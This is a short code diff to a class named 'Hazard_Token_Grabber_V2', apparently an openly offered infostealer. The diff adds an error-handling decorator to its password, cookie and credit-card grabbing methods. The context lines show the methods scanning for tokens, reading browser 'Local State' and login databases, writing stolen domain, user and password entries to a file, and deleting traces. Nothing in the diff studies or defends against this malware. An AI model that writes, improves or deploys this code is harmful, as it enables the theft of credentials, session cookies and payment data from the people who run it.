@@ -431,6 +431,7 @@ class Hazard_Token_Grabber_V2(functions):
                         for token in findall(self.regex, line):
                             asyncio.run(self.checkToken(token))
 
+    @try_extract
     def grabPassword(self):
         for name, path in self.paths.items():
             localState = path + '\\Local State'
@@ -482,6 +483,7 @@ class Hazard_Token_Grabber_V2(functions):
                     conn.close()
                     os.remove(login)
 
+    @try_extract
     def grabCookies(self):
         for name, path in self.paths.items():
             localState = path + '\\Local State'
@@ -789,6 +791,7 @@ class Hazard_Token_Grabber_V2(functions):
                         f.write(
                             f"Domain: {url}\nUser: {name}\nPass: {passw}\n\n")
 
+    @try_extract
     def creditInfo(self):
         for name, path in self.paths.items():
             localState = path + '\\Local State'
